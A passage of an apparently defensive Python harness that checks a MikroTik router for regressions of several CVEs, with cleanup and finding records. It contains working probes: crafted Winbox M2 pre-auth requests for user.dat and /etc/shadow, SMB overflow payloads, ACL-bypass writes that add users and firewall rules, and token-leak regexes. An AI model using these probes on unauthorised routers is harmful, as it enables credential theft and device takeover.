                     f"Size diff: {size_diff_pct:.1f}%, t-stat: {t_stat:.2f}, "
                     f"time diff: {time_diff:.4f}s -- "
                     f"{'ENUMERABLE (REGRESSION)' if enumerable else 'NOT enumerable (PATCHED)'}",
                     details=analysis,
                     anomaly=enumerable)

        if enumerable:
            regression = True
            ec.add_finding("MEDIUM",
                            f"{cve} REGRESSION: Winbox username enumeration",
                            f"Valid vs invalid usernames produce statistically "
                            f"different response sizes ({size_diff_pct:.1f}% diff, "
                            f"t={t_stat:.2f}), enabling username enumeration.",
                            cwe="CWE-204", cvss="5.3",
                            evidence_refs=[f"{cve}_*"])
    else:
        ec.add_test(cve, test_name,
                     "Statistical comparison of valid vs invalid user responses",
                     "Insufficient data for analysis (Winbox may be unreachable)",
                     details=analysis, anomaly=True)

    cve_results[cve] = "REGRESSION" if regression else "PATCHED"
    verify_router_after_cve(cve)


# =============================================================================
# CVE-2023-41570 (CRITICAL 9.1) -- REST API ACL Bypass
# Patched in: 7.12
# ~60 tests
# =============================================================================

def test_cve_2023_41570():
    cve = "CVE-2023-41570"
    log("=" * 60)
    log(f"CVE: {cve} (CRITICAL 9.1) -- REST API ACL Bypass")
    log(f"Patched in: 7.12 | Testing against: 7.20.8")
    log("=" * 60)

    regression = False

    # --- 1. Save original service config ---
    log("  Saving original www service config...")
    orig_www_config = {}
    status, data = rest_get("/ip/service")
    www_id = None
    api_id = None
    if status == 200 and isinstance(data, list):
        for svc in data:
            if svc.get("name") == "www":
                orig_www_config = {"address": svc.get("address", ""),
                                   "disabled": svc.get("disabled", "")}
                www_id = svc.get(".id")
            if svc.get("name") == "api":
                api_id = svc.get(".id")

    # --- 2. Set IP restriction on www service ---
    test_name = f"{cve}_set_www_restriction"
    if www_id:
        status, resp = rest_post("/ip/service/set",
                                  {".id": www_id,
                                   "address": "[REDACTED-INTERNAL-IP]/24"})
        ec.add_test(cve, test_name,
                     "Set www service address restriction to [REDACTED-INTERNAL-IP]/24",
                     f"HTTP {status}: {str(resp)[:200]}",
                     details={"status": status, "response": str(resp)[:200]})
        time.sleep(1)
    else:
        ec.add_test(cve, test_name,
                     "Set www service restriction",
                     "Could not find www service ID", anomaly=True)

    # --- 3. Test REST API access from our IP (should be DENIED) ---
    rest_endpoints_to_test = [
        "/rest/system/resource",
        "/rest/system/identity",
        "/rest/user",
        "/rest/ip/address",
        "/rest/ip/firewall/filter",
        "/rest/ip/service",
        "/rest/system/package",
        "/rest/interface",
        "/rest/ip/route",
        "/rest/log",
        "/rest/file",
        "/rest/system/scheduler",
        "/rest/system/script",
        "/rest/ip/dns",
        "/rest/snmp",
    ]

    bypass_count = 0
    for ep in rest_endpoints_to_test:
        ep_short = ep.replace("/rest/", "").replace("/", "_")
        test_name = f"{cve}_acl_bypass_{ep_short}"

        try:
            r = requests.get(
                f"http://{TARGET}{ep}",
                auth=AUTH, timeout=10, verify=False)

            if r.status_code == 200:
                # We got through despite the ACL -- this is a bypass!
                bypass_count += 1
                ec.add_test(cve, test_name,
                             f"REST {ep} with IP restriction (should be denied)",
                             f"HTTP {r.status_code} -- ACCESS GRANTED (potential bypass!)",
                             details={"endpoint": ep, "status": r.status_code,
                                      "data_size": len(r.text)},
                             anomaly=True)
            elif r.status_code in (401, 403):
                ec.add_test(cve, test_name,
                             f"REST {ep} with IP restriction",
                             f"HTTP {r.status_code} -- ACCESS DENIED (ACL working)",
                             details={"endpoint": ep, "status": r.status_code})
            else:
                ec.add_test(cve, test_name,
                             f"REST {ep} with IP restriction",
                             f"HTTP {r.status_code}",
                             details={"endpoint": ep, "status": r.status_code,
                                      "response": r.text[:200]})
        except requests.exceptions.ConnectionError:
            # Connection refused is expected when ACL blocks us
            ec.add_test(cve, test_name,
                         f"REST {ep} with IP restriction",
                         "Connection refused -- ACL is blocking (expected)",
                         details={"endpoint": ep})
        except Exception as e:
            ec.add_test(cve, test_name,
                         f"REST {ep} with IP restriction",
                         f"Error: {str(e)[:200]}",
                         details={"endpoint": ep})

    # --- 4. Test POST operations through ACL ---
    post_tests = [
        ("/rest/system/identity", {"name": "test_acl_bypass"}, "identity_set"),
        ("/rest/ip/dns/set", {"servers": "[REDACTED-IP]"}, "dns_set"),
        ("/rest/snmp/set", {"enabled": "true"}, "snmp_set"),
        ("/rest/user/add", {"name": "acltest99", "password": "pass123", "group": "read"}, "user_add"),
        ("/rest/system/script/add", {"name": "acltest99", "source": ":log info acl"}, "script_add"),
        ("/rest/ip/firewall/filter/add", {"chain": "input", "action": "accept", "comment": "acltest"}, "fw_add"),
    ]

    for ep, payload, desc in post_tests:
        ep_short = desc.replace(" ", "_")
        test_name = f"{cve}_acl_post_{ep_short}"
        try:
            r = requests.post(
                f"http://{TARGET}{ep}",
                auth=AUTH, json=payload,
                headers={"Content-Type": "application/json"},
                timeout=10, verify=False)

            if r.status_code in (200, 201):
                bypass_count += 1
                ec.add_test(cve, test_name,
                             f"POST {desc} with IP restriction",
                             f"HTTP {r.status_code} -- WRITE ACCESS through ACL!",
                             details={"endpoint": ep, "status": r.status_code},
                             anomaly=True)
            else:
                ec.add_test(cve, test_name,
                             f"POST {desc} with IP restriction",
                             f"HTTP {r.status_code} -- blocked",
                             details={"endpoint": ep, "status": r.status_code})
        except requests.exceptions.ConnectionError:
            ec.add_test(cve, test_name,
                         f"POST {desc} with IP restriction",
                         "Connection refused -- ACL blocking")
        except Exception as e:
            ec.add_test(cve, test_name,
                         f"POST {desc} with IP restriction",
                         f"Error: {str(e)[:100]}")

    # --- 5. Test HTTPS bypass (does ACL apply to www-ssl independently?) ---
    for ep in rest_endpoints_to_test[:8]:
        ep_short = ep.replace("/rest/", "").replace("/", "_")
        test_name = f"{cve}_https_bypass_{ep_short}"
        try:
            r = requests.get(
                f"https://{TARGET}{ep}",
                auth=AUTH, timeout=10, verify=False)

            if r.status_code == 200:
                ec.add_test(cve, test_name,
                             f"HTTPS {ep} while www has IP restriction",
                             f"HTTP {r.status_code} -- HTTPS access (www-ssl separate)",
                             details={"endpoint": ep, "status": r.status_code,
                                      "note": "www-ssl is a separate service"})
            else:
                ec.add_test(cve, test_name,
                             f"HTTPS {ep} while www restricted",
                             f"HTTP {r.status_code}",
                             details={"endpoint": ep, "status": r.status_code})
        except Exception as e:
            ec.add_test(cve, test_name,
                         f"HTTPS {ep} while www restricted",
                         f"Error: {str(e)[:100]}")

    # --- 6. Remove restriction and verify access restored ---
    test_name = f"{cve}_remove_restriction"
    if www_id:
        # Need to use SSH since REST may be blocked
        log("  Removing www restriction via SSH...")
        stdout, stderr, rc = ssh_command("/ip service set www address=\"\"")
        ec.add_test(cve, test_name,
                     "Remove www service address restriction",
                     f"SSH rc={rc}: {stdout[:200]}{stderr[:200]}",
                     details={"rc": rc, "stdout": stdout[:200],
                              "stderr": stderr[:200]})
        time.sleep(2)

    # Verify access is restored
    test_name = f"{cve}_verify_restored"
    r = http_get(f"{HTTP_BASE}/rest/system/resource", auth=AUTH)
    if r is not None and r.status_code == 200:
        ec.add_test(cve, test_name,
                     "Verify REST access restored after removing restriction",
                     f"HTTP {r.status_code} -- access restored",
                     details={"status": r.status_code})
    else:
        ec.add_test(cve, test_name,
                     "Verify REST access restored",
                     f"Access not restored: {r.status_code if r else 'no response'}",
                     anomaly=True)
        # Force restore via SSH
        ssh_command("/ip service set www address=\"\"")
        time.sleep(2)

    # --- 7. Test api service restriction separately ---
    if api_id:
        test_name = f"{cve}_api_service_restriction"
        # Set restriction on api service
        stdout, stderr, rc = ssh_command(
            '/ip service set api address=[REDACTED-INTERNAL-IP]/24')
        ec.add_test(cve, test_name,
                     "Set api service address restriction to [REDACTED-INTERNAL-IP]/24",
                     f"SSH rc={rc}",
                     details={"rc": rc})
        time.sleep(1)

        # Test API port 8728
        test_name = f"{cve}_api_acl_check"
        api_open = tcp_connect(TARGET, 8728, timeout=5)
        if api_open:
            ec.add_test(cve, test_name,
                         "API port 8728 with IP restriction",
                         "Port OPEN -- ACL may not be blocking!",
                         anomaly=True)
        else:
            ec.add_test(cve, test_name,
                         "API port 8728 with IP restriction",
                         "Port blocked -- ACL working")

        # Restore
        ssh_command('/ip service set api address=""')
        time.sleep(1)

    # --- 8. Restore original config and clean up test artifacts ---
    log("  Restoring original www service config and cleaning up...")
    if www_id:
        orig_addr = orig_www_config.get("address", "")
        ssh_command(f'/ip service set www address="{orig_addr}"')
        ssh_command('/system identity set name=MikroTik')
        time.sleep(1)

    # Clean up objects that may have been created through ACL bypass
    _acl_cleanup_items = [
        ("/user", "name", "acltest99", "/user/remove"),
        ("/system/script", "name", "acltest99", "/system/script/remove"),
        ("/ip/firewall/filter", "comment", "acltest", "/ip/firewall/filter/remove"),
    ]
    for list_ep, field, value, remove_ep in _acl_cleanup_items:
        try:
            status, data = rest_get(list_ep)
            if status == 200 and isinstance(data, list):
                for item in data:
                    if item.get(field) == value:
                        rest_post(remove_ep, {".id": item[".id"]})
                        log(f"    Cleaned up {field}={value}")
        except Exception:
            pass

    if bypass_count > 0:
        regression = True
        ec.add_finding("CRITICAL",
                        f"{cve} REGRESSION: REST API ignores IP ACL restrictions",
                        f"{bypass_count} REST API endpoints were accessible despite "
                        f"IP address restriction on www service. The ACL bypass "
                        f"allows unauthorized access from non-permitted IP ranges.",
                        cwe="CWE-284", cvss="9.1",
                        evidence_refs=[f"{cve}_*"])

    cve_results[cve] = "REGRESSION" if regression else "PATCHED"
    verify_router_after_cve(cve)


# =============================================================================
# CVE-2023-30799 (CRITICAL 9.1) -- Privilege Escalation admin->super-admin
# Patched in: 6.49.7 / 7.x
# ~60 tests
# =============================================================================

def test_cve_2023_30799():
    cve = "CVE-2023-30799"
    log("=" * 60)
    log(f"CVE: {cve} (CRITICAL 9.1) -- Privilege Escalation FOISted")
    log(f"Patched in: 6.49.7 / 7.x | Testing against: 7.20.8")
    log("=" * 60)

    regression = False

    # --- 1. Test super-admin-only operations via REST API as admin ---
    superadmin_ops_get = [
        ("/rest/system/license", "System license"),
        ("/rest/system/routerboard", "Routerboard info"),
        ("/rest/system/routerboard/settings", "Routerboard settings"),
        ("/rest/certificate", "Certificates"),
        ("/rest/certificate/crl", "Certificate CRL"),
        ("/rest/system/history", "System history"),
        ("/rest/system/logging", "Logging config"),
        ("/rest/system/watchdog", "Watchdog config"),
    ]

    for ep, desc in superadmin_ops_get:
        test_name = f"{cve}_superadmin_get_{ep.replace('/rest/', '').replace('/', '_')}"
        status, data = rest_get(ep.replace("/rest", ""))
        ec.add_test(cve, test_name,
                     f"Access {desc} as admin via REST GET",
                     f"HTTP {status}",
                     details={"endpoint": ep, "status": status,
                              "data_snippet": str(data)[:200]})

    # --- 2. Try to access system files / internal paths ---
    internal_paths = [
        "/rest/file",
        "/rest/disk",
        "/rest/partitions",
        "/nova/etc/passwd",
        "/flash/nova/etc/passwd",
        "/rw/disk",
        "/flash/rw/store/user.dat",
        "/rw/store/user.dat",
        "/.hidden",
        "/etc/passwd",
    ]

    for path in internal_paths:
        test_name = f"{cve}_internal_path_{path.replace('/', '_').strip('_')[:40]}"
        if path.startswith("/rest"):
            r = http_get(f"{HTTP_BASE}{path}", auth=AUTH)
        else:
            r = http_get(f"{HTTP_BASE}{path}", auth=AUTH)

        if r is not None:
            if r.status_code == 200 and len(r.text) > 10:
                # Accessing internal files is unexpected for regular admin
                ec.add_test(cve, test_name,
                             f"Access internal path: {path}",
                             f"HTTP {r.status_code} -- {len(r.text)} bytes returned",
                             details={"path": path, "status": r.status_code,
                                      "data": r.text[:300]},
                             anomaly=("passwd" in path or "user.dat" in path))
            else:
                ec.add_test(cve, test_name,
                             f"Access internal path: {path}",
                             f"HTTP {r.status_code} -- blocked or not found",
                             details={"path": path, "status": r.status_code})
        else:
            ec.add_test(cve, test_name,
                         f"Access internal path: {path}",
                         "Connection failed")

    # --- 3. Test via SSH as admin ---
    ssh_superadmin_cmds = [
        ("/system license print", "License info"),
        ("/system routerboard print", "Routerboard info"),
        ("/system package down[REDACTED]", "Package down[REDACTED]"),
        ("/user print detail", "User detail listing"),
        ("/export", "Full config export"),
        ("/system sup-output", "Support output"),
    ]

    for cmd, desc in ssh_superadmin_cmds:
        test_name = f"{cve}_ssh_{desc.replace(' ', '_').lower()}"
        stdout, stderr, rc = ssh_command(cmd, timeout=10)
        ec.add_test(cve, test_name,
                     f"SSH command '{cmd}' as admin",
                     f"rc={rc}, stdout={len(stdout)} bytes",
                     details={"command": cmd, "rc": rc,
                              "stdout": stdout[:300],
                              "stderr": stderr[:200]})

    # --- 4. Test with testfull user (full group, not super-admin) ---
    testfull_creds = USERS.get("testfull", {})
    if testfull_creds:
        testfull_pass = testfull_creds["password"]
        testfull_endpoints = [
            "/rest/system/license",
            "/rest/system/routerboard",
            "/rest/user",
            "/rest/system/resource",
            "/rest/ip/service",
        ]

        for ep in testfull_endpoints:
            ep_short = ep.replace("/rest/", "").replace("/", "_")
            test_name = f"{cve}_testfull_get_{ep_short}"
            status, data = rest_get(ep.replace("/rest", ""),
                                     user="testfull", password=testfull_pass)
            ec.add_test(cve, test_name,
                         f"Access {ep} as testfull (full group) via REST",
                         f"HTTP {status}",
                         details={"endpoint": ep, "status": status,
                                  "user": "testfull", "group": "full",
                                  "data_snippet": str(data)[:200]})

        # SSH as testfull
        for cmd, desc in [("/system license print", "License"),
                          ("/user print", "User list")]:
            test_name = f"{cve}_testfull_ssh_{desc.replace(' ', '_').lower()}"
            stdout, stderr, rc = ssh_command(cmd, user="testfull",
                                              password=testfull_pass,
                                              timeout=10)
            ec.add_test(cve, test_name,
                         f"SSH '{cmd}' as testfull",
                         f"rc={rc}, stdout={len(stdout)} bytes",
                         details={"command": cmd, "rc": rc,
                                  "stdout": stdout[:300],
                                  "stderr": stderr[:200]})

    # --- 4b. Test with testread user (read group -- should be restricted) ---
    testread_creds = USERS.get("testread", {})
    if testread_creds:
        testread_pass = testread_creds["password"]
        # testread should NOT be able to write
        write_endpoints = [
            ("/rest/system/identity/set", {"name": "read_escalation"}, "identity_set"),
            ("/rest/user/add", {"name": "escalated99", "password": "x", "group": "full"}, "user_add"),
            ("/rest/ip/firewall/filter/add", {"chain": "input", "action": "accept"}, "fw_add"),
            ("/rest/system/script/add", {"name": "escalated99", "source": ":log info x"}, "script_add"),
            ("/rest/ip/service/set", {".id": "www", "port": "80"}, "service_set"),
        ]

        for ep, payload, desc in write_endpoints:
            test_name = f"{cve}_testread_write_{desc}"
            status, resp = rest_post(ep.replace("/rest", ""), payload,
                                      user="testread", password=testread_pass)
            write_succeeded = status in (200, 201)
            ec.add_test(cve, test_name,
                         f"Write operation '{desc}' as testread (read group)",
                         f"HTTP {status} -- {'WRITE SUCCEEDED (escalation!)' if write_succeeded else 'blocked (expected)'}",
                         details={"endpoint": ep, "status": status, "user": "testread",
                                  "group": "read", "write_succeeded": write_succeeded},
                         anomaly=write_succeeded)
            if write_succeeded:
                regression = True

        # Clean up any test objects that were created
        for cleanup_ep, field, val in [("/user", "name", "escalated99"),
                                        ("/system/script", "name", "escalated99")]:
            try:
                s, d = rest_get(cleanup_ep)
                if s == 200 and isinstance(d, list):
                    for item in d:
                        if item.get(field) == val:
                            rest_post(f"{cleanup_ep}/remove", {".id": item[".id"]})
            except Exception:
                pass

    # --- 5. X-HTTP-Method-Override bypass attempts ---
    method_overrides = [
        ("X-HTTP-Method-Override", "PUT"),
        ("X-HTTP-Method-Override", "DELETE"),
        ("X-HTTP-Method-Override", "PATCH"),
        ("X-HTTP-Method", "PUT"),
        ("X-Method-Override", "PUT"),
    ]

    for header, method in method_overrides:
        test_name = f"{cve}_method_override_{header.replace('-', '_').lower()}_{method.lower()}"
        r = http_post(f"{HTTP_BASE}/rest/system/identity",
                       auth=AUTH,
                       headers={header: method, "Content-Type": "application/json"},
                       json_data={"name": "escalation_test"})
        if r is not None:
            ec.add_test(cve, test_name,
                         f"Method override: {header}: {method}",
                         f"HTTP {r.status_code}",
                         details={"header": header, "method": method,
                                  "status": r.status_code,
                                  "response": r.text[:200]})
        else:
            ec.add_test(cve, test_name,
                         f"Method override: {header}: {method}",
                         "Connection failed")

    # Restore identity
    rest_post("/system/identity/set", {"name": "MikroTik"})

    # --- 6. Check if any endpoint leaks session tokens ---
    token_patterns = [
        r'(?:token|session|sid|jwt)\s*[:=]\s*["\']?([A-Za-z0-9_\-+/=]{16,})',
        r'["\'](?:token|session_id|access_token)["\']:\s*["\']([^"\']+)',
    ]

    token_leak_endpoints = [
        "/rest/user/active",
        "/rest/system/resource",
        "/rest/log",
    ]

    for ep in token_leak_endpoints:
        ep_short = ep.replace("/rest/", "").replace("/", "_")
        test_name = f"{cve}_token_leak_{ep_short}"
        status, data = rest_get(ep.replace("/rest", ""))

        data_str = json.dumps(data) if isinstance(data, (dict, list)) else str(data)
        leaked = False
        for pattern in token_patterns:
            matches = re.findall(pattern, data_str, re.IGNORECASE)
            if matches:
                leaked = True
                break

        ec.add_test(cve, test_name,
                     f"Check {ep} for session token leaks",
                     "Token-like value found!" if leaked else "No token leaks detected",
                     details={"endpoint": ep, "leaked": leaked},
                     anomaly=leaked)

    cve_results[cve] = "REGRESSION" if regression else "PATCHED"
    verify_router_after_cve(cve)


# =============================================================================
# CVE-2018-14847 (CRITICAL 10.0) -- Winbox Pre-Auth File Read/Write
# Patched in: 6.42.1
# ~40 tests
# =============================================================================

def test_cve_2018_14847():
    cve = "CVE-2018-14847"
    log("=" * 60)
    log(f"CVE: {cve} (CRITICAL 10.0) -- Winbox Pre-Auth File Read/Write")
    log(f"Patched in: 6.42.1 | Testing against: 7.20.8")
    log("=" * 60)

    regression = False

    # CVE-2018-14847 exploits handler 24 (file handler) in the Winbox M2
    # protocol. Pre-auth messages to handler 24 allowed reading/writing
    # arbitrary files including user.dat (credential database).

    # Build M2 file-read requests targeting handler 24
    def build_m2_file_request(filename, handler=24):
        """Build an M2 message targeting the file handler pre-auth."""
        fname_bytes = filename.encode("utf-8")

        msg = bytearray()
        # SYS_TO = handler (u32 type)
        msg.append(0x06)   # u32 type
        msg.append(0x00)   # request seq
        msg.append(0xFF)   # SYS namespace marker
        msg.append(0x01)   # SYS_TO field
        msg.extend(struct.pack("<I", handler))

        # SYS_CMD = 7 (open file / list)
        msg.append(0x06)   # u32 type
        msg.append(0x00)
        msg.append(0xFF)
        msg.append(0x07)   # SYS_CMD field
        msg.extend(struct.pack("<I", 7))

        # Filename string
        msg.append(0x09)   # string type
        msg.append(0x01)   # field ID for filename
        msg.append(len(fname_bytes))
        msg.extend(fname_bytes)

        # Frame with 4-byte length header
        frame = struct.pack(">I", len(msg)) + bytes(msg)
        return frame

    # Target files that the original exploit tried to read
    target_files = [
        ("user.dat", "MikroTik credential database"),
        ("/flash/rw/store/user.dat", "Credential DB (full path)"),
        ("/rw/store/user.dat", "Credential DB (alt path)"),
        ("/etc/passwd", "System passwd file"),
        ("/nova/etc/passwd", "Nova passwd file"),
        ("/flash/nova/etc/devel-login", "Developer login config"),
        ("/proc/version", "Kernel version"),
        ("/etc/shadow", "Shadow file"),
        ("/rw/disk", "Disk info"),
        ("/flash/rw/RESET", "Reset config file"),
        ("/rw/logs/", "Log files directory"),
        ("/flash/nova/bin/login", "Login binary"),
        ("/nova/etc/environment", "Environment config"),
        ("/nova/etc/local.conf", "Local configuration"),
        ("/rw/store/config.dat", "Config data"),
    ]

    for filename, desc in target_files:
        test_name = f"{cve}_file_read_{filename.replace('/', '_').strip('_')[:40]}"
        m2_msg = build_m2_file_request(filename, handler=24)
        resp = winbox_connect_and_send(m2_msg, timeout=5)

        if resp is not None:
            resp_hex = resp.hex()
            # Check if response contains file data (>20 bytes usually means content)
            # The patched version should return an error or empty response
            has_file_content = len(resp) > 50 and not all(b == 0 for b in resp[:20])

            # Look for known signatures of file content
            resp_text = resp.decode("utf-8", errors="replace")
            contains_creds = any(kw in resp_text.lower() for kw in
                                  ["root:", "admin", "password", "shadow"])

            if has_file_content and contains_creds:
                regression = True
                ec.add_test(cve, test_name,
                             f"Pre-auth file read: {filename} ({desc})",
                             f"FILE CONTENT RETURNED ({len(resp)} bytes) -- REGRESSION!",
                             details={"filename": filename, "resp_size": len(resp),
                                      "resp_hex": resp_hex[:200],
                                      "contains_creds": True},
                             anomaly=True)
            else:
                ec.add_test(cve, test_name,
                             f"Pre-auth file read: {filename} ({desc})",
                             f"Response: {len(resp)} bytes (no file content -- patched)",
                             details={"filename": filename, "resp_size": len(resp),
                                      "resp_hex": resp_hex[:200],
                                      "has_file_content": has_file_content})
        else:
            ec.add_test(cve, test_name,
                         f"Pre-auth file read: {filename} ({desc})",
                         "No response from Winbox",
                         details={"filename": filename})

    # --- 2. Test file listing (handler 24, cmd for directory listing) ---
    dir_targets = ["/", "/flash/", "/rw/", "/nova/", "/proc/",
                   "/etc/", "/tmp/", "/dev/", "/sys/"]
    for dpath in dir_targets:
        test_name = f"{cve}_dir_list_{dpath.replace('/', '_').strip('_') or 'root'}"
        m2_msg = build_m2_file_request(dpath, handler=24)
        resp = winbox_connect_and_send(m2_msg, timeout=5)

        if resp is not None:
            resp_text = resp.decode("utf-8", errors="replace")
            has_listing = any(kw in resp_text.lower() for kw in
                               ["rw", "flash", "dev", "proc", "etc", "bin"])
            ec.add_test(cve, test_name,
                         f"Pre-auth directory listing: {dpath}",
                         f"Response: {len(resp)} bytes -- "
                         f"{'listing data!' if has_listing else 'no listing'}",
                         details={"path": dpath, "resp_size": len(resp),
                                  "resp_hex": resp.hex()[:200],
                                  "has_listing": has_listing},
                         anomaly=has_listing)
            if has_listing:
                regression = True
        else:
            ec.add_test(cve, test_name,
                         f"Pre-auth directory listing: {dpath}",
                         "No response")

    # --- 3. Test other handlers pre-auth ---
    pre_auth_handlers = [2, 3, 4, 5, 7, 13, 14, 15, 24, 25, 26, 70, 71, 72]
    for handler in pre_auth_handlers:
        test_name = f"{cve}_handler_{handler}_preauth"
        msg = bytearray()
        msg.append(0x06)
        msg.append(0x00)
        msg.append(0xFF)
        msg.append(0x01)
        msg.extend(struct.pack("<I", handler))
        # Minimal request
        msg.append(0x06)
        msg.append(0x00)
        msg.append(0xFF)
        msg.append(0x07)
        msg.extend(struct.pack("<I", 1))  # cmd=1 (generic request)

        frame = struct.pack(">I", len(msg)) + bytes(msg)
        resp = winbox_connect_and_send(frame, timeout=3)

        if resp is not None:
            ec.add_test(cve, test_name,
                         f"Pre-auth access to handler {handler}",
                         f"Response: {len(resp)} bytes",
                         details={"handler": handler, "resp_size": len(resp),
                                  "resp_hex": resp.hex()[:100]})
        else:
            ec.add_test(cve, test_name,
                         f"Pre-auth access to handler {handler}",
                         "No response (handler may reject pre-auth)")

    # --- 4. Variant: handler 2 (system handler) pre-auth access ---
    test_name = f"{cve}_system_handler_preauth"
    msg = bytearray()
    msg.append(0x06)
    msg.append(0x00)
    msg.append(0xFF)
    msg.append(0x01)
    msg.extend(struct.pack("<I", 2))  # handler 2 = system
    msg.append(0x09)  # string
    msg.append(0x01)
    msg.append(0x04)
    msg.extend(b"list")

    frame = struct.pack(">I", len(msg)) + bytes(msg)
    resp = winbox_connect_and_send(frame, timeout=3)
    if resp is not None:
        ec.add_test(cve, test_name,
                     "Pre-auth system handler listing request",
                     f"Response: {len(resp)} bytes",
                     details={"resp_size": len(resp), "resp_hex": resp.hex()[:200]})
    else:
        ec.add_test(cve, test_name,
                     "Pre-auth system handler listing request",
                     "No response")

    if regression:
        ec.add_finding("CRITICAL",
                        f"{cve} REGRESSION: Winbox pre-auth file access",
                        "The Winbox M2 protocol handler 24 returns file content or "
                        "directory listings in response to pre-authentication "
                        "requests. This allows unauthenticated attackers to read "
                        "arbitrary files including credential databases.",
                        cwe="CWE-287", cvss="10.0",
                        evidence_refs=[f"{cve}_*"],
                        reproduction_steps=[
                            "1. Connect to Winbox port 8291",
                            "2. Send M2 message to handler 24 requesting user.dat",
                            "3. File content returned without authentication",
                        ])

    cve_results[cve] = "REGRESSION" if regression else "PATCHED"
    verify_router_after_cve(cve)


# =============================================================================
# CVE-2018-7445 (CRITICAL 10.0) -- SMB Buffer Overflow
# ~20 tests
# =============================================================================

def test_cve_2018_7445():
    cve = "CVE-2018-7445"
    log("=" * 60)
    log(f"CVE: {cve} (CRITICAL 10.0) -- SMB Buffer Overflow")
    log("=" * 60)

    # --- 1. Check if SMB service is available ---
    smb_ports = [(445, "SMB"), (139, "NetBIOS-SSN")]
    smb_available = False

    for port, name in smb_ports:
        test_name = f"{cve}_port_check_{port}"
        is_open = tcp_connect(TARGET, port, timeout=5)
        ec.add_test(cve, test_name,
                     f"Check if {name} port {port} is open",
                     f"Port {port}: {'OPEN' if is_open else 'CLOSED'}",
                     details={"port": port, "service": name, "open": is_open})
        if is_open:
            smb_available = True

    if not smb_available:
        # Check SMB service configuration
        test_name = f"{cve}_smb_config"
        status, data = rest_get("/ip/smb")
        if status == 200:
            ec.add_test(cve, test_name,
                         "Check SMB service configuration",
                         f"SMB config: {str(data)[:300]}",
                         details={"smb_config": data})
        else:
            ec.add_test(cve, test_name,
                         "Check SMB service configuration",
                         f"HTTP {status} -- SMB config not available",
                         details={"status": status})

        # Also check via SSH
        test_name = f"{cve}_smb_ssh_check"
        stdout, stderr, rc = ssh_command("/ip smb print")
        ec.add_test(cve, test_name,
                     "Check SMB config via SSH",
                     f"rc={rc}: {stdout[:200]}",
                     details={"rc": rc, "stdout": stdout[:200],
                              "stderr": stderr[:200]})

        # Check if SMB package is installed
        test_name = f"{cve}_smb_package"
        status, data = rest_get("/system/package")
        smb_pkg = None
        if status == 200 and isinstance(data, list):
            for pkg in data:
                if "smb" in pkg.get("name", "").lower():
                    smb_pkg = pkg
        ec.add_test(cve, test_name,
                     "Check if SMB package is installed",
                     f"SMB package: {smb_pkg}" if smb_pkg else "No SMB package found",
                     details={"smb_package": smb_pkg})

        # Try enabling SMB via REST/SSH
        test_name = f"{cve}_enable_smb_attempt"
        status, resp = rest_post("/ip/smb/set", {"enabled": "yes"})
        ec.add_test(cve, test_name,
                     "Attempt to enable SMB service via REST",
                     f"HTTP {status}: {str(resp)[:200]}",
                     details={"status": status, "response": str(resp)[:200]})

        test_name = f"{cve}_enable_smb_ssh"
        stdout, stderr, rc = ssh_command("/ip smb set enabled=yes")
        ec.add_test(cve, test_name,
                     "Attempt to enable SMB service via SSH",
                     f"rc={rc}: {stdout[:200]} {stderr[:200]}",
                     details={"rc": rc, "stdout": stdout[:200],
                              "stderr": stderr[:200]})

        # Re-check ports after enable attempt
        time.sleep(2)
        for port, name in smb_ports:
            test_name = f"{cve}_recheck_port_{port}"
            is_open = tcp_connect(TARGET, port, timeout=5)
            ec.add_test(cve, test_name,
                         f"Re-check {name} port {port} after enable attempt",
                         f"Port {port}: {'OPEN' if is_open else 'STILL CLOSED'}",
                         details={"port": port, "open": is_open})
            if is_open:
                smb_available = True

        # Check SMB shares if any
        test_name = f"{cve}_smb_shares"
        status, data = rest_get("/ip/smb/share")
        ec.add_test(cve, test_name,
                     "Check SMB share configuration",
                     f"HTTP {status}: {str(data)[:200]}",
                     details={"status": status, "data": str(data)[:200]})

        # Check SMB users
        test_name = f"{cve}_smb_users"
        status, data = rest_get("/ip/smb/user")
        ec.add_test(cve, test_name,
                     "Check SMB user configuration",
                     f"HTTP {status}: {str(data)[:200]}",
                     details={"status": status, "data": str(data)[:200]})

        if not smb_available:
            # Truly untestable
            for i in range(3):
                ec.add_test(cve, f"{cve}_smb_unavailable_{i}",
                             f"SMB overflow test {i+1}: Service not available on CHR",
                             "UNTESTABLE -- SMB ports not open on CHR image",
                             details={"note": "CHR (Cloud Hosted Router) does not "
                                      "have SMB service enabled/available"})

        cve_results[cve] = "UNTESTABLE (SMB not available)"
        verify_router_after_cve(cve)
        return

    # --- 2. If SMB is available, test the vulnerability ---
    log("  SMB port is open -- testing buffer overflow...")

    # NetBIOS Session Setup with oversized payload
    netbios_payloads = [
        # Normal NetBIOS session request
        (b"\x81\x00\x00\x44" + b"\x20" + b"A" * 32 + b"\x00" +
         b"\x20" + b"A" * 32 + b"\x00", "normal_session"),
        # Oversized session name (buffer overflow vector)
        (b"\x81\x00\x04\x00" + b"\x20" + b"A" * 1024, "oversized_name"),
        # Maximum length NetBIOS
        (b"\x81\xff\xff\xff" + b"A" * 4096, "max_length"),
        # Crafted SMB negotiate with overflow
        (b"\x00\x00\x00\x85" +
         b"\xffSMB" +
         b"\x72" +                    # Negotiate command
         b"\x00" * 27 +               # Flags, padding
         b"\x00\x62" +                # Byte count
         b"\x02" + b"A" * 2048,       # Dialect string overflow
         "smb_negotiate_overflow"),
    ]

    for payload, label in netbios_payloads:
        test_name = f"{cve}_smb_overflow_{label}"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            port = 445 if tcp_connect(TARGET, 445) else 139
            s.connect((TARGET, port))
            s.send(payload)
            time.sleep(0.5)
            resp = s.recv(4096)
            s.close()

            ec.add_test(cve, test_name,
                         f"SMB overflow attempt: {label}",
                         f"Response: {len(resp)} bytes -- service survived",
                         details={"payload_size": len(payload), "label": label,
                                  "resp_size": len(resp),
                                  "resp_hex": resp.hex()[:100]})
        except socket.timeout:
            ec.add_test(cve, test_name,
                         f"SMB overflow attempt: {label}",
                         "No response (timeout)")
        except ConnectionResetError:
            ec.add_test(cve, test_name,
                         f"SMB overflow attempt: {label}",
                         "Connection reset (possible crash?)",
                         anomaly=True)
        except Exception as e:
            ec.add_test(cve, test_name,
                         f"SMB overflow attempt: {label}",
                         f"Error: {str(e)[:200]}")

    cve_results[cve] = "PATCHED"
    verify_router_after_cve(cve)


# =============================================================================
# CVE-2019-3943 (MEDIUM) -- FTP Directory Traversal
# Patched in: 6.44
# ~40 tests
# =============================================================================

def test_cve_2019_3943():
    cve = "CVE-2019-3943"
